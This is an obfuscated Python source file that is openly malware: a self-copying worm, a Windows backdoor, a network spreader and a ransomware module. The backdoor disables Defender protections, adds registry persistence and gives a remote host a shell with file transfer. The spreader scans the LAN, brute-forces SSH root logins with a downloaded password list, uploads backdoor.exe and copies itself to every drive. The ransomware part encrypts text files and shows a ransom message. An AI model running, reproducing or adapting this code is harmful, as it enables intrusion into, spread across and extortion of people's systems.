_OO0O00O0OOOOO0000 ='public_key.pem'#line:1
_O00O0O00OOO00O000 ='private_key.pem'#line:2
_O00OO0OO00O0OO00O ='__main__'#line:3
_OO0O0OOOOOOOOOO0O ='default'#line:4
_OO00O0OO000OOOO0O ='rb'#line:5
_O00O00O0OOOOOOOOO ='wb'#line:6
_OOOOOO00OOO000000 =True #line:7
_OOO00OO0OO000OO00 =None #line:8
import spwd ,crypt ,requests ,nmap ,paramiko ,os ,socket ,urllib ,sys ,urllib #line:9
from urllib .request import urlopen #line:10
import time #line:11
from time import sleep #line:12
import ftplib #line:13
from ftplib import FTP #line:14
import shutil #line:15
from shutil import copy2 #line:16
import win32api ,netifaces #line:17
from threading import Thread #line:18
import socket ,subprocess #line:19
from subprocess import call #line:20
from subprocess import Popen #line:21
import tarfile #line:22
gws =netifaces .gateways ()#line:23
gateway =gws [_OO0O0OOOOOOOOOO0O ][netifaces .AF_INET ][0 ]#line:24
class worm :#line:25
	def __init__ (O0O0OO0OOOOOO0OO0 ,path =_OOO00OO0OO000OO00 ,target_dir_list =_OOO00OO0OO000OO00 ,iteration =_OOO00OO0OO000OO00 ):#line:26
		O0O0O0O0OO00000OO =target_dir_list #line:27
		if isinstance (path ,type (_OOO00OO0OO000OO00 )):O0O0OO0OOOOOO0OO0 .path ='/'#line:28
		else :O0O0OO0OOOOOO0OO0 .path =path #line:29
		if isinstance (O0O0O0O0OO00000OO ,type (_OOO00OO0OO000OO00 )):O0O0OO0OOOOOO0OO0 .target_dir_list =[]#line:30
		else :O0O0OO0OOOOOO0OO0 .target_dir_list =O0O0O0O0OO00000OO #line:31
		if isinstance (O0O0O0O0OO00000OO ,type (_OOO00OO0OO000OO00 )):O0O0OO0OOOOOO0OO0 .iteration =2 #line:32
		else :O0O0OO0OOOOOO0OO0 .iteration =iteration #line:33
		O0O0OO0OOOOOO0OO0 .own_path =os .path .realpath (__file__ )#line:34
	def l (OOOO00000OOOOO0O0 ,OOO0O0O0OOO00O0O0 ):#line:35
		OOO0000OOO0OOOO0O =OOO0O0O0OOO00O0O0 ;OOOO00000OOOOO0O0 .target_dir_list .append (OOO0000OOO0OOOO0O );OO00O0O0O00000OO0 =os .listdir (OOO0000OOO0OOOO0O )#line:36
		for OOOOO000OOOOO0O00 in OO00O0O0O00000OO0 :#line:37
			OOOO00O0OOOOOOOOO =os .path .join (OOO0000OOO0OOOO0O ,OOOOO000OOOOO0O00 );print (OOOO00O0OOOOOOOOO )#line:38
			if os .path .isdir (OOOO00O0OOOOOOOOO ):OOOO00000OOOOO0O0 .l (OOOO00O0OOOOOOOOO )#line:39
			else :0 #line:40
	def n (OOO000OOO0O0O0OOO ):#line:41
		for O00O0O0000OO0OOO0 in OOO000OOO0O0O0OOO .target_dir_list :O0O00000OOOOO000O =os .path .join (O00O0O0000OO0OOO0 ,'.xr.py');shutil .copyfile (OOO000OOO0O0O0OOO .own_path ,O0O00000OOOOO000O )#line:42
	def c (OO0O00OO0OOO00000 ):#line:43
		for OOOO00OOO00OO00O0 in OO0O00OO0OOO00000 .target_dir_list :#line:44
			O000O00OOO0O0OO00 =os .listdir (OOOO00OOO00OO00O0 )#line:45
			for O0O0O000O00OO0000 in O000O00OOO0O0OO00 :#line:46
				OO0O00OO0O0000O0O =os .path .join (OOOO00OOO00OO00O0 ,O0O0O000O00OO0000 )#line:47
				if not OO0O00OO0O0000O0O .startswith ('.')and not os .path .isdir (OO0O00OO0O0000O0O ):#line:48
					O0000O000O0000O00 =OO0O00OO0O0000O0O #line:49
					for O0O00OO00OO00O0O0 in range (OO0O00OO0OOO00000 .iteration ):OO0OOOOOOOO0OOOOO =os .path .join (OOOO00OOO00OO00O0 ,'.'+O0O0O000O00OO0000 +str (O0O00OO00OO00O0O0 ));shutil .copyfile (O0000O000O0000O00 ,OO0OOOOOOOO0OOOOO )#line:50
	def s (OOO0000OO0OOO00OO ):OOO0000OO0OOO00OO .l (OOO0000OO0OOO00OO .path );print (OOO0000OO0OOO00OO .target_dir_list );OOO0000OO0OOO00OO .n ();OOO0000OO0OOO00OO .c ()#line:51
	if __name__ ==_O00OO0OO00O0OO00O :current_directory =os .path .abspath ('');worm =worm (path =current_directory );worm .s ()#line:52
class Backdoor :#line:53
	import socket ,json ,subprocess ,time ,os ,threading ,shutil ,sys ,win32com ;ASADMIN ='asadmin'#line:54
	if sys .argv [-1 ]!=ASADMIN :script =os .path .abspath (sys .argv [0 ]);params =' '.join ([script ]+sys .argv [1 :]+[ASADMIN ]);win32com .shell .shell .ShellExecuteEx (lpVerb ='runas',lpFile =sys .executable ,lpParameters =params );sys .exit (0 )#line:55
	os .system ('powershell.exe -command Add-MpPreference -ExclusionExtension .exe');os .system ('powershell.exe -command Set-MpPreference -PUAProtection disable')#line:56
	def reliable_send (O0O00000O0O0O00O0 ):OO0OOO0O0O000OO0O =Backdoor .json .dumps (O0O00000O0O0O00O0 );Backdoor .send (OO0OOO0O0O000OO0O .encode ())#line:57
	def reliable_recv ():#line:58
		O00000000OOO0O0OO =''#line:59
		while _OOOOOO00OOO000000 :#line:60
			try :O00000000OOO0O0OO =O00000000OOO0O0OO +Backdoor .recv (1024 ).decode ().rstrip ();return Backdoor .json .loads (O00000000OOO0O0OO )#line:61
			except ValueError :continue #line:62
	def is_admin ():#line:63
		global admin #line:64
		try :O00OO0OO0O0O0OO0O =os .listdir (os .sep .join ([os .environ .get ('SystemRoot','C:\\windows'),'temp']))#line:65
		except :admin ='[!!!]User Privileges!!!'#line:66
		else :admin ='[+] Admin Privileges!!!'#line:67
	def download_file (O000OO0000OOO00O0 ):#line:68
		O00O0000O00OO00OO =open (O000OO0000OOO00O0 ,_O00O00O0OOOOOOOOO );Backdoor .settimeout (1 );OO00OOOO0OOOO00O0 =Backdoor .recv (1024 )#line:69
		while OO00OOOO0OOOO00O0 :#line:70
			O00O0000O00OO00OO .write (OO00OOOO0OOOO00O0 )#line:71
			try :OO00OOOO0OOOO00O0 =Backdoor .recv (1024 )#line:72
			except socket .timeout as O00O0O000O0O0OOO0 :break #line:73
		Backdoor .settimeout (_OOO00OO0OO000OO00 );O00O0000O00OO00OO .close ()#line:74
	def upload_file (OOOOO00OOOOO0O0OO ):OO00OO0O0OOOOOOO0 =open (OOOOO00OOOOO0O0OO ,_OO00O0OO000OOOO0O );Backdoor .send (OO00OO0O0OOOOOOO0 .read ())#line:75
	def persist (OO000OO0O0O00000O ,O00OO00OOOO0O0O00 ):#line:76
		OOO000O0OOO0OO0OO =os .environ ['appdata']+'\\'+O00OO00OOOO0O0O00 #line:77
		try :#line:78
			if not os .path .exists (OOO000O0OOO0OO0OO ):shutil .copyfile (sys .executable ,OOO000O0OOO0OO0OO );subprocess .call ('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v '+OO000OO0O0O00000O +' /t REG_SZ /d "'+OOO000O0OOO0OO0OO +'"',shell =_OOOOOO00OOO000000 );Backdoor .reliable_send ('[+] Created Persistence With Reg Key: '+OO000OO0O0O00000O )#line:79
			else :Backdoor .reliable_send ('[+] Persistence Already Exists')#line:80
		except :Backdoor .reliable_send ('[+] Error Creating Persistence With The Target Machine')#line:81
	def connection ():#line:82
		while _OOOOOO00OOO000000 :#line:83
			time .sleep (20 )#line:84
			try :Backdoor .connect (('192.168.56.1',4545 ));Backdoor .shell ();Backdoor .close ();break #line:85
			except :Backdoor .connection ()#line:86
	def shell ():#line:87
		while _OOOOOO00OOO000000 :#line:88
			O00OO00OO0OO0OO00 =Backdoor .reliable_recv ()#line:89
			if O00OO00OO0OO0OO00 =='quit':break #line:90
			elif O00OO00OO0OO0OO00 =='background':0 #line:91
			elif O00OO00OO0OO0OO00 =='worm':worm .s ()#line:92
			elif O00OO00OO0OO0OO00 =='wifi':Network .main ()#line:93
			elif O00OO00OO0OO0OO00 =='help':0 #line:94
			elif O00OO00OO0OO0OO00 =='clear':0 #line:95
			elif O00OO00OO0OO0OO00 =='encrypt':Ransom .encrypt ()#line:96
			elif O00OO00OO0OO0OO00 =='decrypt':Ransom .decrypt ()#line:97
			elif O00OO00OO0OO0OO00 [:3 ]=='cd ':os .chdir (O00OO00OO0OO0OO00 [3 :])#line:98
			elif O00OO00OO0OO0OO00 [:5 ]=='check':#line:99
				try :Backdoor .is_admin ();Backdoor .reliable_send (admin )#line:100
				except :Backdoor .reliable_send ('Something Went Wrong')#line:101
			elif O00OO00OO0OO0OO00 [:6 ]=='upload':Backdoor .download_file (O00OO00OO0OO0OO00 [7 :])#line:102
			elif O00OO00OO0OO0OO00 [:8 ]=='download':Backdoor .upload_file (O00OO00OO0OO0OO00 [9 :])#line:103
			elif O00OO00OO0OO0OO00 [:11 ]=='persistence':OO0OOOOO0O0OO0OO0 ,OO0O0000000000OOO =O00OO00OO0OO0OO00 [12 :].split (' ');Backdoor .persist (OO0OOOOO0O0OO0OO0 ,OO0O0000000000OOO )#line:104
			elif O00OO00OO0OO0OO00 [:7 ]=='sendall':subprocess .Popen (O00OO00OO0OO0OO00 [8 :],shell =_OOOOOO00OOO000000 ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:105
			else :O00O000OO00000O0O =subprocess .Popen (O00OO00OO0OO0OO00 ,shell =_OOOOOO00OOO000000 ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE );OOOOO0OO000OO0O00 =O00O000OO00000O0O .stdout .read ()+O00O000OO00000O0O .stderr .read ();OOOOO0OO000OO0O00 =OOOOO0OO000OO0O00 .decode ();Backdoor .reliable_send (OOOOO0OO000OO0O00 )#line:106
		OOO00O0OO00OO0O0O =socket .socket (socket .AF_INET ,socket .SOCK_STREAM );Backdoor .connection ()#line:107
class Network :#line:108
	import nmap ,paramiko ,os ,socket ;from urllib .request import urlopen ;import urllib ,time ;from ftplib import FTP ;import ftplib ;from shutil import copy2 ;import win32api ,netifaces ;from threading import Thread ;import networking ,coloredlogs ,logging ;logger =logging .getLogger (__name__ );coloredlogs .install (fmt ='%(message)s',level ='DEBUG',logger =logger );gws =netifaces .gateways ();gateway =gws [_OO0O0OOOOOOOOOO0O ][netifaces .AF_INET ][0 ]#line:109
	def scan_hosts (OOOOOO00O00OOOO00 ):'\n        Scans all machines on the same network that\n        have the specified port enabled \n        Returns:\n            IP addresses of hosts\n        ';Network .logger .debug (f"Scanning machines on the same network with port {OOOOOO00O00OOOO00} open.");Network .logger .debug ('Gateway: '+gateway );OOOOOOO0O0OOO0O0O =nmap .PortScanner ();OOOOOOO0O0OOO0O0O .scan (gateway +'/24',arguments ='-p'+str (OOOOOO00O00OOOO00 )+' --open');OO00OOOOO000O00O0 =OOOOOOO0O0OOO0O0O .all_hosts ();Network .logger .debug ('Hosts: '+str (OO00OOOOO000O00O0 ));return OO00OOOOO000O00O0 #line:110
	def download_ssh_passwords (OO0OOOO0OO00000OO ):'\n        Downloads most commonly used ssh passwords from a specific url\n        Clearly, you can store passwords in a dictionary, but i found this more comfortable\n\n        Args:\n            filename - Name to save the file as.\n        ';Network .logger .debug ('Downloading passwords...');O0OOOO0O0000O0OO0 ='https://raw.githubusercontent.com/Olegatopt/10_million_password_list_top_100000/main/10_million_password_list_top_100000.txt';urllib .request .urlretrieve (O0OOOO0O0000O0OO0 ,OO0OOOO0OO00000OO );Network .logger .debug ('Passwords downloaded!')#line:111
	def connect_to_ftp (OO00O000O0OO000O0 ,OO0O0OOO00O0O000O ,O0O0OOOO00O000000 ):#line:112
		try :OOO00O0O0OOO0O00O =FTP (OO00O000O0OO000O0 );OOO00O0O0OOO0O00O .login (OO0O0OOO00O0O000O ,O0O0OOOO00O000000 )#line:113
		except ftplib .all_errors as OO000OO000O00O0OO :Network .logger .error (OO000OO000O00O0OO );pass #line:114
	def connect_to_ssh (O0OO00OOOO0OO0OO0 ,O00O0OOOO0O0OO00O ):#line:115
		O0000OOO00O0O0OOO =False ;OOO0000OO0O0OO0O0 =paramiko .SSHClient ();OOO0000OO0O0OO0O0 .set_missing_host_key_policy (paramiko .AutoAddPolicy ())#line:116
		try :Network .logger .debug ('Connecting to: '+O0OO00OOOO0OO0OO0 );OOO0000OO0O0OO0O0 .connect (O0OO00OOOO0OO0OO0 ,22 ,'root',O00O0OOOO0O0OO00O );Network .logger .debug ('Successfully connected!');O0000OOOO000000OO =OOO0000OO0O0OO0O0 .open_sftp ();O0000OOOO000000OO .put ('backdoor.exe','destination');return _OOOOOO00OOO000000 #line:117
		except socket .error :Network .logger .error ('Computer is offline or port 22 is closed');return O0000OOO00O0O0OOO #line:118
		except paramiko .ssh_exception .AuthenticationException :Network .logger .error ('Wrong Password or Username');return O0000OOO00O0O0OOO #line:119
		except paramiko .ssh_exception .SSHException :Network .logger .error ('No response from SSH server');return O0000OOO00O0O0OOO #line:120
	def bruteforce_ssh (OOOO000OOO0000OO0 ,O0OOO0O0O00O0000O ):#line:121
		'\n        Calls connect_to_ssh function and\n        tries to bruteforce the target server.\n\n        Args:\n            wordlist - TXT file with passwords\n\n        ';O00O0O00O00OO0O00 =open (O0OOO0O0O00O0000O ,'r')#line:122
		for O00O0O0OOOOO0O00O in O00O0O00O00OO0O00 :OOO0000O000OO0O00 =Network .connect_to_ssh (OOOO000OOO0000OO0 ,O00O0O0OOOOO0O00O );print (OOO0000O000OO0O00 );time .sleep (5 )#line:123
	def drivespreading ():#line:124
		O000O0O00OOO000O0 =os .path .expanduser ('~')+'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'#line:125
		while _OOOOOO00OOO000000 :#line:126
			O0OO0OO000O00OO00 =win32api .GetLogicalDriveStrings ();O0OO0OO000O00OO00 =O0OO0OO000O00OO00 .split ('\x00')[:-1 ];print (O0OO0OO000O00OO00 )#line:127
			for O000000O00O0000O0 in O0OO0OO000O00OO00 :#line:128
				try :#line:129
					if 'C:\\'==O000000O00O0000O0 :copy2 (__file__ ,O000O0O00OOO000O0 )#line:130
					else :copy2 (__file__ ,O000000O00O0000O0 )#line:131
				except :pass #line:132
			time .sleep (3 )#line:133
	def start_drive_spreading ():O00OOOO0O000OOO00 =Thread (target =Network .drivespreading );O00OOOO0O000OOO00 .start ()#line:134
	def main ():Network .start_drive_spreading ()#line:135
	if __name__ ==_O00OO0OO00O0OO00O :main ()#line:136
class Ransom :#line:137
	import os ,base64 ;from cryptography .hazmat .primitives .asymmetric import rsa ;from cryptography .hazmat .primitives import serialization ;from cryptography .hazmat .backends import default_backend ;from cryptography .hazmat .primitives .asymmetric import padding ;from cryptography .hazmat .primitives import hashes #line:138
	try :#line:139
		private_key =rsa .generate_private_key (public_exponent =65537 ,key_size =int (7e4 ),backend =default_backend ());private_pem =private_key .private_bytes (encoding =serialization .Encoding .PEM ,format =serialization .PrivateFormat .PKCS8 ,encryption_algorithm =serialization .NoEncryption ())#line:140
		with open (_O00O0O00OOO00O000 ,_O00O00O0OOOOOOOOO )as f :f .write (private_pem )#line:141
		public_key =private_key .public_key ();public_pem =public_key .public_bytes (encoding =serialization .Encoding .PEM ,format =serialization .PublicFormat .SubjectPublicKeyInfo )#line:142
		with open (_OO0O00O0OOOOO0000 ,_O00O00O0OOOOOOOOO )as f :f .write (public_pem )#line:143
		print ('\nSuccessfully created Public and Private Key\n')#line:144
	except Exception as e :print ('\nFailure\n');print (e )#line:145
	files =os .listdir ()#line:146
	def decrypt (O00O00O00OOOOOOO0 ):#line:147
		with open (_O00O0O00OOO00O000 ,_OO00O0OO000OOOO0O )as OO0OOOO0000O000OO :OO0OO0OO00OOOO00O =Ransom .serialization .load_pem_private_key (OO0OOOO0000O000OO .read (),password =_OOO00OO0OO000OO00 ,backend =Ransom .default_backend ());OO0OOOOOO00OOOOO0 =OO0OO0OO00OOOO00O .decrypt (Ransom .base64 .b64decode (O00O00O00OOOOOOO0 ),Ransom .padding .OAEP (mgf =Ransom .padding .MGF1 (algorithm =Ransom .hashes .SHA256 ()),algorithm =Ransom .hashes .SHA256 (),label =_OOO00OO0OO000OO00 ))#line:148
		return OO0OOOOOO00OOOOO0 #line:149
	def encrypt (O0OO00O0OO00O000O ):#line:150
		with open (_OO0O00O0OOOOO0000 ,_OO00O0OO000OOOO0O )as O0OO000O00O00OOOO :O0OO0O000O0O00000 =Ransom .serialization .load_pem_public_key (O0OO000O00O00OOOO .read (),backend =Ransom .default_backend ())#line:151
		O000000000O000OOO =Ransom .base64 .b64encode (O0OO0O000O0O00000 .encrypt (O0OO00O0OO00O000O ,Ransom .padding .OAEP (mgf =Ransom .padding .MGF1 (algorithm =Ransom .hashes .SHA256 ()),algorithm =Ransom .hashes .SHA256 (),label =_OOO00OO0OO000OO00 )));return O000000000O000OOO #line:152
	def encryption ():#line:153
		for OO0000O0OOO00O00O in Ransom .files :#line:154
			if OO0000O0OOO00O00O .endswith ('.txt'):O0O0OOO0O0O00OO00 =open (OO0000O0OOO00O00O ,_OO00O0OO000OOOO0O );O0OO00O0000O0OOOO =O0O0OOO0O0O00OO00 .read ();O0O0OOO0O0O00OO00 =open (OO0000O0OOO00O00O ,_O00O00O0OOOOOOOOO );OO0OOO0OOO0000O00 =Ransom .encrypt (O0OO00O0000O0OOOO );O0O0OOO0O0O00OO00 .write (OO0OOO0OOO0000O00 )#line:155
	def decryption ():#line:156
		for OO0000O000O0O0000 in Ransom .files :#line:157
			if OO0000O000O0O0000 .endswith ('.txt'):OO0O00OO0OOOOO0OO =open (OO0000O000O0O0000 ,_OO00O0OO000OOOO0O );O0OO00O00OO0O00O0 =OO0O00OO0OOOOO0OO .read ();OO0O00OO0OOOOO0OO =open (OO0000O000O0O0000 ,_O00O00O0OOOOOOOOO );OO00000O0OO00O000 =Ransom .decrypt (O0OO00O00OO0O00O0 );OO0O00OO0OOOOO0OO .write (OO00000O0OO00O000 );print (OO00000O0OO00O000 )#line:158
	skull ='\n                        ______\n                    .-"      "-.\n                    /            \\\n                    |              |\n                    |,  .-.  .-.  ,|\n            /\\   | )(__/  \\__)( |\n            _ \\/   |/     /\\     \\|\n            \\_\\/    (_     ^^     _)   .-==/~\\\n        ___/_,__,_\\__|IIIIII|__/__)/   /{~}}\n        ---,---,---|-\\IIIIII/-|---,\'-\' {{~}\n                    \\          /     \'-==\\}/\n                    `--------`\n    '#line:159
	try :#line:160
		print (skull );print ('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx');print ('\n YOU HAVE BEEN HACKED \n');print ("\n PLEASE, DON'T KILL THIS PROCESS, AS YOUR DATA WILL BE LOST"+'\x1b[1m'+'FOREVER.\n'+'\x1b[0m');print ('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n\n');encryption ()#line:161
		try :#line:162
			print (' ************************************ ');print ('Do you have your decription Key?(Y/N) : ');userInput =input ()#line:163
			while userInput .lower ()=='N':print ('Please contact to know your key.');userInput =input ()#line:164
			decryption ()#line:165
		except Exception as e :print (f"There has been an error! (DO NOT ABUSE OF MY CLEMENCY): {e}");print ('')#line:166
	except Exception as e :print ('Encryption Failed')#line:167
while _OOOOOO00OOO000000 :Backdoor .shell ();input =input ()